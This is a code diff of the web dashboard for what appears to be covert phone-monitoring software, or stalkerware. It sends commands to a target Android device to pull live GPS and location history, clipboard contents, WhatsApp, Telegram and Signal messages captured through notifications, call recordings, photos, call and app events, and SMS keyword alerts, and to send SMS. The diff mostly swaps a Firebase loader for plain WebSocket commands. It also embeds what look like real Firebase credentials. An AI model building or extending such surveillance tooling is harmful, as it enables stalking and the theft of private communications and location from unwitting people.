     function displayWifiNetworks(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -2263,20 +2379,42 @@ window.addEventListener('load', () => {
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Clipboard ─────────────────────────────────────────────────────────────
     function displayClipboard(data) {
-        const clip = (typeof data === 'object' && data !== null) ? data : { content: String(data || ''), type: 'text' };
+        const content = data && data.content ? data.content : (data || '');
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '📋 Clipboard';
         const card = document.createElement('div');
         card.style.cssText = 'background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;margin-top:12px';
-        const typeDiv = document.createElement('div'); typeDiv.style.cssText = 'font-size:11px;color:#999;margin-bottom:6px'; typeDiv.textContent = 'Type: ' + (clip.type || 'unknown');
-        const contentDiv = document.createElement('div'); contentDiv.style.cssText = 'font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6'; contentDiv.textContent = clip.content || '(empty)';
+        const typeDiv = document.createElement('div'); typeDiv.style.cssText = 'font-size:11px;color:#999;margin-bottom:6px'; typeDiv.textContent = 'Type: ' + (data && data.type ? data.type : 'text');
+        const contentDiv = document.createElement('div'); contentDiv.style.cssText = 'font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6'; contentDiv.textContent = content;
         card.appendChild(typeDiv); card.appendChild(contentDiv);
         panel.appendChild(h3); panel.appendChild(card);
     }
 
-    // ── Geofence ──────────────────────────────────────────────────────────────
+    // ---------- LIVE GPS ----------
+    function toggleLiveGps() {
+        const btn = document.getElementById('liveGpsBtn');
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+                btn.style.background = '#d32f2f';
+                btn.style.color = '#fff';
+            }
+            showNotification('Live GPS started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+                btn.style.cssText = '';
+            }
+            showNotification('GPS stopped');
+        }
+    }
+
+    // ---------- GEOFENCE ----------
     function showGeofencePanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🗺️ Geofence — Safety Zone';
@@ -2344,7 +2482,7 @@ window.addEventListener('load', () => {
         showNotification('Geofence set at ' + lat.toFixed(4) + ', ' + lon.toFixed(4));
     }
 
-    // ── Auto Screenshot ───────────────────────────────────────────────────────
+    // ---------- AUTO SCREENSHOT ----------
     function showSchedulePanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '⏱️ Auto Screenshot';
@@ -2388,7 +2526,7 @@ window.addEventListener('load', () => {
         showNotification('Auto-capture every ' + mins + ' min');
     }
 
-    // ── Send SMS ──────────────────────────────────────────────────────────────
+    // ---------- SEND SMS ----------
     function showSendSmsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '✉️ Send SMS';
@@ -2403,7 +2541,7 @@ window.addEventListener('load', () => {
             wrap.appendChild(lbl); wrap.appendChild(inp); return wrap;
         }
         form.appendChild(makeField('Phone Number', 'smsNumber', 'input', { type: 'tel', placeholder: '+91 99999 00000' }));
-        form.appendChild(makeField('Message',      'smsBody',   'textarea', { rows: 4, placeholder: 'Type message…', style: 'width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;resize:vertical;box-sizing:border-box' }));
+        form.appendChild(makeField('Message',      'smsBody',   'textarea', { rows: 4, placeholder: 'Type message…' }));
 
         const sendBtn = document.createElement('button');
         sendBtn.textContent = '📤 Send';
@@ -2420,17 +2558,12 @@ window.addEventListener('load', () => {
         sendCommand('SEND_SMS', { number: number, body: body });
     }
 
-
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 1: SOCIAL MESSAGES
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 1: SOCIAL MESSAGES ----------
     let socialMsgsData = [];
-    let liveNotifCount = 0;
 
     function showSocialMessagesPanel() {
         panel.innerHTML = '';
-        const h3 = document.createElement('h3');
-        h3.textContent = '💬 Social Messages';
+        const h3 = document.createElement('h3'); h3.textContent = '💬 Social Messages';
         panel.appendChild(h3);
         const filterRow = document.createElement('div');
         filterRow.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px';
@@ -2449,27 +2582,24 @@ window.addEventListener('load', () => {
             b.textContent = item[0];
             b.style.cssText = 'padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
             b.addEventListener('click', function() {
-                loadHybrid('social_messages', item[1],
-                    'GET_SOCIAL_MESSAGES', {days: item[1]},
-                    displaySocialMessages, loadSocialFromFirebase);
+                sendCommand('GET_SOCIAL_MESSAGES', {days: item[1]});
             });
             dayRow.appendChild(b);
         });
         const note = document.createElement('p');
         note.style.cssText = 'color:#999;font-size:12px;margin-bottom:8px';
-        note.textContent = 'Captures WhatsApp, Telegram, Instagram, Signal and others via Notification Access.';
+        note.textContent = 'Captures WhatsApp, Telegram, Instagram and other notifications.';
         const list = document.createElement('div'); list.id = 'socialMsgList';
         panel.appendChild(filterRow); panel.appendChild(dayRow);
         panel.appendChild(note); panel.appendChild(list);
-        loadHybrid('social_messages', 1, 'GET_SOCIAL_MESSAGES', {days:1},
-            displaySocialMessages, loadSocialFromFirebase);
+        sendCommand('GET_SOCIAL_MESSAGES', {days:1});
     }
 
     function displaySocialMessages(data) {
         const container = document.getElementById('socialMsgList') || panel;
         container.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            container.innerHTML = '<p style="color:#999;padding:16px 0">No messages. Enable Notification Access on the device.</p>';
+            container.innerHTML = '<p style="color:#999;padding:16px 0">No messages found.</p>';
             return;
         }
         socialMsgsData = data;
@@ -2481,23 +2611,23 @@ window.addEventListener('load', () => {
         container.innerHTML = '';
         data.forEach(function(n) {
             const card = document.createElement('div');
-            card.dataset.pkg = n.pkg || '';
+            card.dataset.pkg = n.pkg || n.packageName || '';
             card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
             const top = document.createElement('div');
             top.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
             const appSpan = document.createElement('span');
             appSpan.style.cssText = 'font-weight:700;font-size:13px;color:#1976ff';
-            appSpan.textContent = n.app || '';
+            appSpan.textContent = n.app || n.packageName || 'Unknown';
             const timeSpan = document.createElement('span');
             timeSpan.style.cssText = 'color:#aaa;font-size:11px';
-            timeSpan.textContent = n.timeFmt || '';
+            timeSpan.textContent = n.timeFmt || n.date || '';
             top.appendChild(appSpan); top.appendChild(timeSpan);
             const sender = document.createElement('div');
             sender.style.cssText = 'font-size:13px;font-weight:600;color:#333;margin-bottom:2px';
             sender.textContent = n.sender || n.title || '';
             const text = document.createElement('div');
             text.style.cssText = 'font-size:13px;color:#555;line-height:1.4';
-            text.textContent = n.text || '';
+            text.textContent = n.text || n.body || '';
             card.appendChild(top); card.appendChild(sender); card.appendChild(text);
             container.appendChild(card);
         });
@@ -2506,28 +2636,22 @@ window.addEventListener('load', () => {
     function filterSocialByPkg(pkg) {
         if (!socialMsgsData.length) return;
         const filtered = pkg === 'ALL' ? socialMsgsData
-            : socialMsgsData.filter(function(n) { return n.pkg === pkg; });
+            : socialMsgsData.filter(function(n) { return (n.pkg === pkg || n.packageName === pkg); });
         renderSocialMessages(filtered);
     }
 
     function pushLiveNotification(json) {
-        liveNotifCount++;
         pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || ''));
-        if (json.isSocial) {
-            showNotification('💬 ' + (json.app || '') + ': ' + ((json.text || '').substring(0, 40)));
-        }
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 2: CALL RECORDINGS
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 2: CALL RECORDINGS ----------
     function showCallRecordingsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🎙️ Call Recordings';
         panel.appendChild(h3);
         const note = document.createElement('p');
         note.style.cssText = 'color:#ff9800;font-size:12px;margin-bottom:12px;background:#fff3e0;border-radius:6px;padding:8px';
-        note.textContent = '⚠️ On Xiaomi/MIUI: only mic audio captured. VOICE_CALL source requires stock Android or root.';
+        note.textContent = '⚠️ On some devices, only microphone audio may be captured.';
         panel.appendChild(note);
         const btnRow = document.createElement('div');
         btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
@@ -2536,9 +2660,7 @@ window.addEventListener('load', () => {
             b.textContent = item[0];
             b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
             b.addEventListener('click', function() {
-                loadHybrid('call_recordings', item[1],
-                    'GET_CALL_RECORDINGS', {days: item[1]},
-                    displayCallRecordings, loadCallRecordingsFromFirebase);
+                sendCommand('GET_CALL_RECORDINGS', {days: item[1]});
             });
             btnRow.appendChild(b);
         });
@@ -2546,15 +2668,14 @@ window.addEventListener('load', () => {
         const listDiv = document.createElement('div'); listDiv.id = 'callRecList';
         listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
         panel.appendChild(listDiv);
-        loadHybrid('call_recordings', 5, 'GET_CALL_RECORDINGS', {days:5},
-            displayCallRecordings, loadCallRecordingsFromFirebase);
+        sendCommand('GET_CALL_RECORDINGS', {days:5});
     }
 
     function displayCallRecordings(data) {
         const container = document.getElementById('callRecList') || panel;
         container.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            container.innerHTML = '<p style="color:#999">No recordings yet. Calls are recorded automatically.</p>';
+            container.innerHTML = '<p style="color:#999">No recordings yet.</p>';
             return;
         }
         data.forEach(function(rec) {
@@ -2567,7 +2688,7 @@ window.addEventListener('load', () => {
             nameDiv.textContent = dirIcon + ' ' + (rec.name || rec.number || 'Unknown');
             const detailDiv = document.createElement('div');
             detailDiv.style.cssText = 'font-size:12px;color:#999;margin-top:2px';
-            detailDiv.textContent = (rec.number || '') + '  •  ' + (rec.duration || '') + '  •  ' + (rec.timeFmt || '');
+            detailDiv.textContent = (rec.number || '') + '  •  ' + (rec.duration || '') + '  •  ' + (rec.timeFmt || rec.date || '');
             left.appendChild(nameDiv); left.appendChild(detailDiv);
             const playBtn = document.createElement('button');
             playBtn.textContent = '▶ Play';
@@ -2617,9 +2738,7 @@ window.addEventListener('load', () => {
         audioEl.play().catch(function() {});
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 3: PHOTO GALLERY
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 3: PHOTO GALLERY ----------
     function showPhotoGalleryPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🖼️ Photo Gallery';
@@ -2631,10 +2750,7 @@ window.addEventListener('load', () => {
             b.textContent = item[0];
             b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
             b.addEventListener('click', function() {
-                const grid = document.getElementById('photoGrid');
-                if (grid) grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
-                loadHybrid('images_meta', item[1], 'GET_RECENT_IMAGES', {days: item[1]},
-                    displayPhotoGallery, loadImagesFromFirebase);
+                sendCommand('GET_RECENT_IMAGES', {days: item[1]});
             });
             btnRow.appendChild(b);
         });
@@ -2643,8 +2759,7 @@ window.addEventListener('load', () => {
         grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px';
         grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
         panel.appendChild(grid);
-        loadHybrid('images_meta', 5, 'GET_RECENT_IMAGES', {days:5},
-            displayPhotoGallery, loadImagesFromFirebase);
+        sendCommand('GET_RECENT_IMAGES', {days:5});
     }
 
     function displayPhotoGallery(data) {
@@ -2652,7 +2767,7 @@ window.addEventListener('load', () => {
         if (!grid) return;
         grid.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            grid.innerHTML = '<p style="color:#999">No images in last 5 days.</p>'; return;
+            grid.innerHTML = '<p style="color:#999">No images found.</p>'; return;
         }
         data.forEach(function(img) {
             const tile = document.createElement('div');
@@ -2667,10 +2782,10 @@ window.addEventListener('load', () => {
             }
             const overlay = document.createElement('div');
             overlay.style.cssText = 'position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px 4px';
-            overlay.textContent = img.dateFmt || '';
+            overlay.textContent = img.dateFmt || img.date || '';
             tile.appendChild(overlay);
             tile.addEventListener('click', function() {
-                sendCommand('GET_IMAGE', {mediaId: img.id || img.mediaId, maxDim: 1200});
+                sendCommand('GET_IMAGE', {mediaId: img.id || img.mediaId});
                 showNotification('Loading image...');
             });
             grid.appendChild(tile);
@@ -2695,16 +2810,14 @@ window.addEventListener('load', () => {
         document.body.appendChild(modal);
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 7: LOCATION HISTORY
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 7: LOCATION HISTORY ----------
     function showLocationHistoryPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '📍 Location History';
         panel.appendChild(h3);
         const note = document.createElement('p');
         note.style.cssText = 'color:#666;font-size:12px;margin-bottom:10px';
-        note.textContent = 'GPS fixes logged automatically every 30 minutes.';
+        note.textContent = 'GPS fixes logged automatically.';
         panel.appendChild(note);
         const btnRow = document.createElement('div');
         btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap';
@@ -2713,9 +2826,7 @@ window.addEventListener('load', () => {
             b.textContent = item[0];
             b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
             b.addEventListener('click', function() {
-                loadHybrid('location_history', item[1],
-                    'GET_LOCATION_HISTORY', {days: item[1]},
-                    displayLocationHistory, loadLocationHistoryFromFirebase);
+                sendCommand('GET_LOCATION_HISTORY', {days: item[1]});
             });
             btnRow.appendChild(b);
         });
@@ -2725,8 +2836,7 @@ window.addEventListener('load', () => {
         panel.appendChild(mapDiv);
         const listDiv = document.createElement('div'); listDiv.id = 'historyList';
         panel.appendChild(listDiv);
-        loadHybrid('location_history', 3, 'GET_LOCATION_HISTORY', {days:3},
-            displayLocationHistory, loadLocationHistoryFromFirebase);
+        sendCommand('GET_LOCATION_HISTORY', {days:3});
         setTimeout(function() {
             try {
                 window._historyMap = L.map('historyMap').setView([20.5937, 78.9629], 5);
@@ -2740,7 +2850,7 @@ window.addEventListener('load', () => {
         if (!listDiv) return;
         listDiv.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            listDiv.innerHTML = '<p style="color:#999">No history yet. Auto-logging starts on app connect.</p>';
+            listDiv.innerHTML = '<p style="color:#999">No history yet.</p>';
             return;
         }
         if (window._historyMap) {
@@ -2752,7 +2862,7 @@ window.addEventListener('load', () => {
                         radius: i === 0 ? 8 : 5,
                         color: i === 0 ? '#d32f2f' : '#1976ff', fillOpacity: 0.8
                     }).addTo(window._historyMap)
-                    .bindPopup('<b>' + (p.timeFmt || '') + '</b><br>' + (p.address || (p.lat.toFixed(4)+','+p.lon.toFixed(4))));
+                    .bindPopup('<b>' + (p.timeFmt || p.date || '') + '</b><br>' + (p.address || (p.lat.toFixed(4)+','+p.lon.toFixed(4))));
                 });
                 if (coords.length > 0) window._historyMap.setView(coords[0], 13);
             } catch(e) { console.warn('Map plot:', e); }
@@ -2763,7 +2873,7 @@ window.addEventListener('load', () => {
         const tbody = document.createElement('tbody');
         data.forEach(function(p) {
             const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.cssText = 'padding:6px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = p.timeFmt || '';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:6px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = p.timeFmt || p.date || '';
             const td2 = document.createElement('td'); td2.style.padding = '6px 8px'; td2.textContent = p.address || (p.lat.toFixed(4)+', '+p.lon.toFixed(4));
             const td3 = document.createElement('td'); td3.style.cssText = 'padding:6px 8px;text-align:center';
             const a = document.createElement('a'); a.href = 'https://maps.google.com/?q='+p.lat+','+p.lon;
@@ -2774,16 +2884,14 @@ window.addEventListener('load', () => {
         tbl.appendChild(tbody); listDiv.appendChild(tbl);
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 5+6: APP EVENTS (installs / call log)
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 5+6: APP EVENTS ----------
     function showAppEventsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '📦 App & Call Events';
         panel.appendChild(h3);
         const note = document.createElement('p');
         note.style.cssText = 'color:#666;font-size:12px;margin-bottom:12px';
-        note.textContent = 'App installs/removals and call events, logged automatically.';
+        note.textContent = 'App installs/removals and call events.';
         panel.appendChild(note);
         const btnRow = document.createElement('div');
         btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
@@ -2792,9 +2900,7 @@ window.addEventListener('load', () => {
             b.textContent = item[0];
             b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
             b.addEventListener('click', function() {
-                loadHybrid('app_events', item[1],
-                    'GET_APP_EVENTS', {days: item[1]},
-                    displayAppEvents, loadAppEventsFromFirebase);
+                sendCommand('GET_APP_EVENTS', {days: item[1]});
             });
             btnRow.appendChild(b);
         });
@@ -2802,8 +2908,7 @@ window.addEventListener('load', () => {
         const listDiv = document.createElement('div'); listDiv.id = 'appEventsList';
         listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
         panel.appendChild(listDiv);
-        loadHybrid('app_events', 5, 'GET_APP_EVENTS', {days:5},
-            displayAppEvents, loadAppEventsFromFirebase);
+        sendCommand('GET_APP_EVENTS', {days:5});
     }
 
     function displayAppEvents(data) {
@@ -2812,7 +2917,10 @@ window.addEventListener('load', () => {
         if (!Array.isArray(data) || data.length === 0) {
             container.innerHTML = '<p style="color:#999">No events yet.</p>'; return;
         }
-        const iconMap = {INSTALLED:'📱',REMOVED:'🗑️',CALL_INCOMING:'📞',CALL_OUTGOING:'📤',CALL_MISSED:'📵'};
+        const iconMap = {
+            'INSTALLED':'📱', 'REMOVED':'🗑️',
+            'CALL_INCOMING':'📞', 'CALL_OUTGOING':'📤', 'CALL_MISSED':'📵'
+        };
         data.forEach(function(ev) {
             const row = document.createElement('div');
             row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0';
@@ -2822,16 +2930,14 @@ window.addEventListener('load', () => {
             const name = document.createElement('div'); name.style.cssText = 'font-weight:600;font-size:13px';
             name.textContent = ev.name || ev.pkg || ev.extra || ev.type;
             const detail = document.createElement('div'); detail.style.cssText = 'font-size:11px;color:#999;margin-top:2px';
-            detail.textContent = ev.type + (ev.pkg ? '  •  '+ev.pkg : '') + '  •  ' + (ev.timeFmt || '');
+            detail.textContent = (ev.type || '') + (ev.pkg ? '  •  '+ev.pkg : '') + '  •  ' + (ev.timeFmt || ev.date || '');
             info.appendChild(name); info.appendChild(detail);
             row.appendChild(icon); row.appendChild(info);
             container.appendChild(row);
         });
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FEATURE 8: SMS KEYWORD ALERTS
-    // ══════════════════════════════════════════════════════════════════
+    // ---------- FEATURE 8: SMS KEYWORD ALERTS ----------
     function showSmsKeywordsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🔑 SMS Keyword Alerts';
@@ -2902,7 +3008,7 @@ window.addEventListener('load', () => {
             const kw = document.createElement('span');
             kw.style.cssText = 'background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700';
             kw.textContent = alert.keyword;
-            const time = document.createElement('span'); time.style.cssText = 'font-size:11px;color:#999'; time.textContent = alert.timeFmt || '';
+            const time = document.createElement('span'); time.style.cssText = 'font-size:11px;color:#999'; time.textContent = alert.timeFmt || alert.date || '';
             top.appendChild(kw); top.appendChild(time);
             const from = document.createElement('div'); from.style.cssText = 'font-size:12px;color:#555;margin-top:4px'; from.textContent = 'From: ' + (alert.from || '');
             const body = document.createElement('div'); body.style.cssText = 'font-size:13px;color:#333;margin-top:4px'; body.textContent = alert.body || alert.message || '';
@@ -2911,90 +3017,14 @@ window.addEventListener('load', () => {
         });
     }
 
-    // ══════════════════════════════════════════════════════════════════
-    // FIREBASE HYBRID LOADER + FIRESTORE READERS
-    // ══════════════════════════════════════════════════════════════════
-    function loadHybrid(collection, days, wsCommand, wsParams, displayFn, firebaseFn) {
-        if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined'
-                && firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
-            firebaseFn(days, function(data, err) {
-                if (!err && data && data.length > 0) {
-                    showFbStatus('☁️ Firebase: ' + data.length + ' records');
-                    displayFn(data);
-                }
-            });
-        }
-        sendCommand(wsCommand, wsParams || {});
-    }
-
-    function showFbStatus(msg) {
-        let el = document.getElementById('fbStatusBar');
-        if (!el) {
-            el = document.createElement('div'); el.id = 'fbStatusBar';
-            el.style.cssText = 'position:fixed;bottom:12px;right:12px;background:rgba(25,118,210,0.9);color:#fff;padding:8px 14px;border-radius:20px;font-size:12px;z-index:9999;pointer-events:none;transition:opacity 0.3s';
-            document.body.appendChild(el);
-        }
-        el.textContent = msg; el.style.opacity = '1';
-        setTimeout(function() { el.style.opacity = '0'; }, 3000);
-    }
-
-    function formatTimestamp(ts, dateOnly) {
-        if (!ts) return '';
-        const d = new Date(typeof ts === 'number' && ts < 9999999999 ? ts * 1000 : ts);
-        if (dateOnly) return d.getDate()+'/'+(d.getMonth()+1)+'/'+d.getFullYear().toString().slice(-2);
-        return ('0'+d.getDate()).slice(-2)+'/'+ ('0'+(d.getMonth()+1)).slice(-2)+' '+('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
-    }
-
-    // Firestore reader stubs — only active when Firebase is configured
-    function loadSocialFromFirebase(days, cb) {
-        _fbRead('social_messages', days, cb);
-    }
-    function loadCallRecordingsFromFirebase(days, cb) {
-        _fbRead('call_recordings', days, cb);
-    }
-    function loadImagesFromFirebase(days, cb) {
-        _fbRead('images_meta', days, cb);
-    }
-    function loadLocationHistoryFromFirebase(days, cb) {
-        _fbRead('location_history', days, cb);
-    }
-    function loadAppEventsFromFirebase(days, cb) {
-        _fbRead('app_events', days, cb);
-    }
-    function loadSmsAlertsFromFirebase(days, cb) {
-        _fbRead('sms_alerts', days, cb);
-    }
-
-    function _fbRead(col, days, cb) {
-        try {
-            if (typeof firebase === 'undefined' || !window.firestoreDb) { cb(null, 'Firebase not init'); return; }
-            const devId = typeof currentDeviceId !== 'undefined' ? currentDeviceId : null;
-            if (!devId) { cb(null, 'No device'); return; }
-            const cutoff = Date.now() - (days * 86400000);
-            window.firestoreDb.collection('devices').doc(devId).collection(col)
-                .where('timestamp', '>', cutoff).orderBy('timestamp', 'desc').limit(300).get()
-                .then(function(snap) {
-                    const items = snap.docs.map(function(doc) {
-                        const d = doc.data();
-                        d.timeFmt = formatTimestamp(d.timestamp);
-                        return d;
-                    });
-                    cb(items, null);
-                })
-                .catch(function(e) { cb(null, e.message); });
-        } catch(e) { cb(null, e.message); }
-    }
-
-    function startSocialMessagesLiveListener() {}  // activated by Firebase block below
-    function startLocationLiveListener() {}
-
+    // ---------- FIREBASE ----------
     function showFirebaseSettingsPanel() {
         panel.innerHTML = '';
         const h3 = document.createElement('h3'); h3.textContent = '🔥 Firebase Configuration';
         panel.appendChild(h3);
         const desc = document.createElement('p');
         desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
-        desc.innerHTML = 'Enter your Firebase project config. Get it from <a href="https://console.firebase.google.com" target="_blank" style="color:#1976ff">Firebase Console</a> → Project Settings → Web App.';
+        desc.innerHTML = 'Enter your Firebase project config.';
         panel.appendChild(desc);
         const fbConf = (typeof firebaseConfig !== 'undefined') ? firebaseConfig : {};
         const fields = [
@@ -3053,7 +3083,7 @@ window.addEventListener('load', () => {
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
-    window.manualReconnect = manualReconnect;   // for manual reconnect
+    window.manualReconnect = manualReconnect;
     window.snapScreen = snapScreenFromModal;
     window.showAppUsagePanel = showAppUsagePanel;
     window.showGeofencePanel = showGeofencePanel;
@@ -3076,38 +3106,32 @@ window.addEventListener('load', () => {
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
-    // ---------- START ----------
-    connectWebSocket();   // initial connection
+    // ---------- INITIALIZE ----------
+    connectWebSocket();
 </script>
 
-<!-- Firebase config + Firestore initialisation (separate non-module script) -->
+<!-- Firebase config + Firestore initialisation -->
 <script>
-// ── Replace these values with your Firebase project config ────────────────
-// Firebase Console → Project Settings → Your Apps → Web App → SDK Config
 var firebaseConfig = {
-    apiKey:            "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
-    authDomain:        "webviewiot.firebaseapp.com",
-    projectId:         "webviewiot",
-    storageBucket:     "webviewiot.firebasestorage.app",
-    messagingSenderId: "634777347775",
-    appId:             "1:634777347775:web:f8efc5bcdf19e3f1de880a"
+  apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+  authDomain: "webviewiot.firebaseapp.com",
+  databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "webviewiot",
+  storageBucket: "webviewiot.firebasestorage.app",
+  messagingSenderId: "634777347775",
+  appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+  measurementId: "G-2KW4EJYTRB"
 };
 
-// Load saved config from localStorage (set via 🔥 Firebase Setup panel)
 try {
     var _saved = localStorage.getItem('fbConfig');
     if (_saved) Object.assign(firebaseConfig, JSON.parse(_saved));
 } catch(e) {}
 
-// Initialise only if real credentials are provided
 if (firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
     firebase.initializeApp(firebaseConfig);
     window.firestoreDb = firebase.firestore();
-    window.firestoreDb.enablePersistence()
-        .catch(function(e) { console.warn('Firestore persistence:', e.code); });
-    firebase.auth().signInAnonymously()
-        .then(function() { console.log('Firebase auth OK'); })
-        .catch(function(e) { console.warn('Firebase auth:', e.message); });
+    firebase.auth().signInAnonymously().catch(function(e) { console.warn('Firebase auth:', e.message); });
     console.log('Firebase initialised:', firebaseConfig.projectId);
 } else {
     console.log('Firebase not configured — using WebSocket only');
